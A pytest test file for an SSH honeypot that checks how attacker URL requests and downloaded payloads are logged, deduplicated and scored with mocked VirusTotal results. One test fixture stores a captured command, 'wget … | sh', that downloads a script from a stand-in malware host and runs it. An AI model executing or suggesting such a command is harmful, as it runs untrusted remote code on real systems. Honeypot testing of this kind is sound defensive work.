import pytest
import os
import shutil
import tempfile
import sqlite3
import hashlib
import json
import datetime
from unittest.mock import MagicMock, patch

from ssh_honeypot.core.database import HoneyDB
from ssh_honeypot.core.payload_manager import PayloadManager
from ssh_honeypot.core.db_utils import sync_db_schema


# --- Fixtures ---
@pytest.fixture
def mock_db():
    temp_dir = tempfile.mkdtemp()
    db_path = os.path.join(temp_dir, "test_honeypot.sqlite")
    db = HoneyDB(db_path)
    # Sync schema to create tables
    sync_db_schema(db)
    yield db
    shutil.rmtree(temp_dir)


@pytest.fixture
def payload_manager(mock_db):
    pm = PayloadManager(mock_db)
    temp_payload_dir = tempfile.mkdtemp()
    with patch("ssh_honeypot.core.payload_manager.PAYLOAD_DIR", temp_payload_dir):
        if not os.path.exists(temp_payload_dir):
            os.makedirs(temp_payload_dir)
        yield pm
    shutil.rmtree(temp_payload_dir)


# --- Tests ---


def test_discovery_context_preservation(mock_db):
    """Verify that URL discovery context is saved in malicious_payloads."""
    session_id = "test-sess-1"
    url = "http://malware.com/script.sh"
    method = "POST"
    user_agent = "Exploit-Tool/1.0"
    command_text = "wget -O - http://malware.com/script.sh | sh"

    mock_db.log_url_request(
        session_id=session_id,
        url=url,
        method=method,
        user_agent=user_agent,
        command_text=command_text,
    )

    # Check malicious_payloads
    conn = mock_db._get_conn()
    row = conn.execute(
        "SELECT * FROM malicious_payloads WHERE url = ?", (url,)
    ).fetchone()
    conn.close()

    assert row is not None
    # Index 12: method, 13: user_agent, 14: command_text (based on TABLE_SCHEMAS)
    # Let's use column names for safety if we can, but sqlite3.Row isn't enabled by default in HoneyDB
    # malicious_payloads schema: id(0), url(1), url_hash(2), session_id(3), ip(4), timestamp(5),
    # method(6), user_agent(7), command_text(8)... wait I changed the order!

    # Let's check the schema order in db_schema.py:
    # id, url, url_hash, session_id, ip, timestamp, method, user_agent, command_text
    assert row[6] == method
    assert row[7] == user_agent
    assert row[8] == command_text
    assert row[3] == session_id  # session_id


def test_deduplicated_analysis_storage(payload_manager, mock_db):
    """Verify that analysis is deduplicated in payload_analysis table."""
    url1 = "http://site-a.com/payload.sh"
    url2 = "http://site-b.com/payload.sh"
    # Content must be > 500 bytes to avoid being skipped by VT logic
    content = b"malicious_code_xyz" * 50
    file_hash = hashlib.md5(content).hexdigest()

    # 1. Queue and Analyze first URL
    payload_manager.queue_payload(url1, "s1", "1.1.1.1")

    # Mock VTAnalyzer since it might be None if no API key
    mock_vt = MagicMock()
    payload_manager.vt_analyzer = mock_vt

    with patch("requests.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.iter_content.return_value = [content]
        mock_get.return_value = mock_resp

        # Mock VT checks
        mock_report = MagicMock()
        mock_report.last_analysis_stats = {"malicious": 5, "undetected": 60}
        mock_report.crowdsourced_ai_results = []
        mock_report.tags = []
        mock_report.popular_threat_classification = None
        mock_report.meaningful_name = "test_malware"
        mock_report.sha256 = "dummy_sha256"
        mock_vt.check_hash.return_value = mock_report

        # Bypass SSRF Check
        with patch.object(payload_manager, "_is_safe_url", return_value=(True, "Safe")):
            # Download first
            payload_manager.process_queue()
            # Then Analyze
            payload_manager.process_analysis_queue(force=True)

    # Check payload_analysis table
    analysis = mock_db.get_payload_analysis(file_hash)
    assert analysis is not None
    assert analysis["risk_score"] == 50  # 5 * 10
    assert "Flagged by 5 engines" in analysis["analysis_summary"]

    # 2. Queue and Analyze second URL (pointing to SAME content)
    payload_manager.queue_payload(url2, "s2", "2.2.2.2")

    with patch("requests.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.iter_content.return_value = [content]
        mock_get.return_value = mock_resp

        # VT should NOT be called again if we use dedup logic (ideally)
        # But analyze_payload calls it anyway currently.
        # The key is that it UPDATES the same row in payload_analysis.
        payload_manager.process_queue()

    # Verify we still have only ONE analysis row for this MD5
    conn = mock_db._get_conn()
    count = conn.execute(
        "SELECT COUNT(*) FROM payload_analysis WHERE payload_md5 = ?", (file_hash,)
    ).fetchone()[0]
    conn.close()
    assert count == 1


def test_get_recent_payloads_join(payload_manager, mock_db):
    """Verify get_recent_payloads returns data from both tables."""
    url = "http://hit.com/malware"
    content = b"content"
    md5 = hashlib.md5(content).hexdigest()

    # Manual Insert to bypass whole download flow for speed
    mock_db.add_malicious_payload(
        url=url,
        url_hash="hash1",
        session_id="s1",
        ip="1.1.1.1",
        payload_md5=md5,
        status="completed",
    )
    mock_db.update_payload_analysis(
        payload_md5=md5, risk_score=75, analysis_summary="Very Risky"
    )

    recent = mock_db.get_recent_payloads(limit=1)
    assert len(recent) == 1
    assert recent[0]["url"] == url
    assert recent[0]["risk_score"] == 75
    assert recent[0]["explanation"] == "Very Risky"


def test_orphan_table_cleanup(mock_db):
    """Verify that sync_db_schema drops requested_urls."""
    conn = mock_db._get_conn()
    # Manually create requested_urls
    conn.execute("CREATE TABLE requested_urls (id INTEGER PRIMARY KEY)")
    conn.commit()

    # Verify it exists
    exists = conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table' AND name='requested_urls'"
    ).fetchone()
    assert exists is not None
    conn.close()

    # Sync Schema
    sync_db_schema(mock_db)

    # Verify it's gone
    conn = mock_db._get_conn()
    exists = conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table' AND name='requested_urls'"
    ).fetchone()
    conn.close()
    assert exists is None
